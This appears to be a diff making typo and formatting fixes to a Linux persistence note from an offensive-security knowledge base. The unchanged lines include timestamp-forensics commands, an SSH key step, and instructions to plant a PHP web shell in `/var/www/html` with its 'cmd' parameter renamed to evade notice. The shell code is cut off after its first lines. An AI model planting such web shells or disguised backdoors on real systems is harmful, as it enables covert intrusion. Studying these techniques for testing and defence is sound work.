@@ -1,6 +1,6 @@
 # Linux Persistence
 
-For general overview of persistance that OS neutral: [[Persistence]].
+For general overview of persistence that OS neutral: [[Persistence]].
 
 ## Nohup
 
@@ -16,7 +16,7 @@ done
 
 #### Ippsec Timestamp checking
 
-Find all timestamps as [[Linux-Blueteam]], with touch cp the persistence mechanicism with `touch`
+Find all timestamps as [[Linux-Blueteam]], with `touch` `cp` the persistence mechanicism with `touch`
 ```bash
 ls -lt --time-style=full-iso# Displys all timestamps
 find / -type f -printf "%T+ %p\n" | grep -v 00000000
@@ -52,10 +52,10 @@ chmod 600 id_rsa
 ```
 
 #### php
-web root /var/www/html
-`touch shell.php` and add the below:
-Or add within a file of this directory
-Change the 'cmd' paramtre to something that LESS like to be called 
+1. in web root `/var/www/html`
+2. `touch shell.php` and add the below:
+2. Or add within a file of this directory
+1. Change the 'cmd' parameter to something that LESS like to be called 
 ```php
 <?php
     if (isset($_REQUEST['cmd'])) {
